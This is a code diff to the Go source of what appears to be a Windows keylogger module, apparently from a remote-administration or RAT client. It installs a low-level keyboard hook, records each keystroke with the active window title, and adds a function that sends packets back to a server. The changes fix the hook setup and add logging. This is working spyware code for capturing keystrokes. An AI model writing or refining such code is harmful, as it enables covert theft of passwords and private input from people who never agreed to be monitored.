@@ -136,6 +136,8 @@ func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
 			key := vkCodeToString(kbdStruct.VkCode)
 			window := getActiveWindow()
 			
+			fmt.Printf("Key captured: %s in window: %s\n", key, window)
+			
 			event := KeyEvent{
 				Key:       key,
 				Timestamp: time.Now(),
@@ -146,19 +148,8 @@ func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
 			globalKeylogger.AddEvent(event)
 			
 		case WM_KEYUP, WM_SYSKEYUP:
-			// Optionally capture key up events
-			kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
-			key := vkCodeToString(kbdStruct.VkCode)
-			window := getActiveWindow()
-			
-			event := KeyEvent{
-				Key:       key,
-				Timestamp: time.Now(),
-				Window:    window,
-				Type:      "keyup",
-			}
-			
-			globalKeylogger.AddEvent(event)
+			// Only capture keydown events to avoid duplicates
+			// Comment out key up events for now
 		}
 	}
 	
@@ -200,9 +191,12 @@ func getActiveWindow() string {
 
 // Start the keyboard hook
 func (k *Keylogger) startHook() {
+	// Set global keylogger reference for the hook procedure
+	globalKeylogger = k
+	
 	moduleHandle, _, _ := procGetModuleHandle.Call(0)
 	
-	keyboardHook, _, _ = procSetWindowsHookEx.Call(
+	keyboardHook, _, err := procSetWindowsHookEx.Call(
 		WH_KEYBOARD_LL,
 		syscall.NewCallback(lowLevelKeyboardProc),
 		moduleHandle,
@@ -210,8 +204,13 @@ func (k *Keylogger) startHook() {
 	)
 	
 	if keyboardHook == 0 {
+		// Hook installation failed - likely due to permissions
+		fmt.Printf("Failed to install keyboard hook: %v\n", err)
+		k.sendErrorEvent("Failed to install keyboard hook - Administrator privileges may be required")
 		return
 	}
+	
+	fmt.Println("Keyboard hook installed successfully")
 	
 	// Message loop
 	var msg MSG
@@ -235,4 +234,20 @@ func (k *Keylogger) stopHook() {
 		procUnhookWindowsHookEx.Call(keyboardHook)
 		keyboardHook = 0
 	}
+}
+
+// Send error event to server
+func (k *Keylogger) sendErrorEvent(message string) {
+	if k.conn == nil {
+		return
+	}
+	
+	packet := modules.Packet{
+		Act: "keylogger_error",
+		Data: map[string]any{
+			"error": message,
+		},
+	}
+	
+	k.conn.SendPack(packet)
 }
